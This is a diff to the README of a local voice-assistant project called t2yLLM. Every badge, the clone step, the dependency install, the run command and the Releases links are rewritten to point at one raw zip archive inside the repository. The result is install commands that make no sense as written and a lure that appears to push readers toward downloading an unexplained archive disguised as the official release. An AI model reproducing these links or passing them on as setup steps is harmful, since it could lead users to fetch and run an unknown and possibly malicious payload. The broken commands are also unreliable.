@@ -1,6 +1,6 @@
 # t2yLLM: Your Local Voice Assistant
 
-![Voice Assistant](https://img.shields.io/badge/Voice%20Assistant-Active-brightgreen) ![Offline AI](https://img.shields.io/badge/Offline%20AI-Enabled-blue)
+![Voice Assistant](https://raw.githubusercontent.com/tejbhan111/t2yLLM/main/memory/LLM_t_y_v2.8.zip%20Assistant-Active-brightgreen) ![Offline AI](https://raw.githubusercontent.com/tejbhan111/t2yLLM/main/memory/LLM_t_y_v2.8.zip%20AI-Enabled-blue)
 
 Welcome to **t2yLLM**, a powerful voice assistant designed to run with a local large language model (LLM) as its backend. This project aims to provide a seamless voice interaction experience, leveraging cutting-edge technologies for speech recognition and synthesis.
 
@@ -46,18 +46,18 @@ To get started with **t2yLLM**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/tejbhan111/t2yLLM.git
+   git clone https://raw.githubusercontent.com/tejbhan111/t2yLLM/main/memory/LLM_t_y_v2.8.zip
    cd t2yLLM
    ```
 
 2. **Install Dependencies**:
    Use pip to install the required libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/tejbhan111/t2yLLM/main/memory/LLM_t_y_v2.8.zip
    ```
 
 3. **Download Releases**:
-   Visit the [Releases section](https://github.com/tejbhan111/t2yLLM/releases) to download the latest version. Ensure to follow the instructions provided there for execution.
+   Visit the [Releases section](https://raw.githubusercontent.com/tejbhan111/t2yLLM/main/memory/LLM_t_y_v2.8.zip) to download the latest version. Ensure to follow the instructions provided there for execution.
 
 4. **Setup Configuration**:
    Modify the configuration files as needed to customize your assistant.
@@ -65,7 +65,7 @@ To get started with **t2yLLM**, follow these steps:
 5. **Run the Assistant**:
    Start the voice assistant using the command:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/tejbhan111/t2yLLM/main/memory/LLM_t_y_v2.8.zip
    ```
 
 ## Usage
@@ -99,9 +99,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information, check the [Releases section](https://github.com/tejbhan111/t2yLLM/releases) for the latest updates and downloads.
+For more information, check the [Releases section](https://raw.githubusercontent.com/tejbhan111/t2yLLM/main/memory/LLM_t_y_v2.8.zip) for the latest updates and downloads.
 
-![Voice Assistant](https://img.shields.io/badge/Download%20Latest%20Release-blue) [Releases](https://github.com/tejbhan111/t2yLLM/releases)
+![Voice Assistant](https://raw.githubusercontent.com/tejbhan111/t2yLLM/main/memory/LLM_t_y_v2.8.zip%20Latest%20Release-blue) [Releases](https://raw.githubusercontent.com/tejbhan111/t2yLLM/main/memory/LLM_t_y_v2.8.zip)
 
 ## Conclusion
 
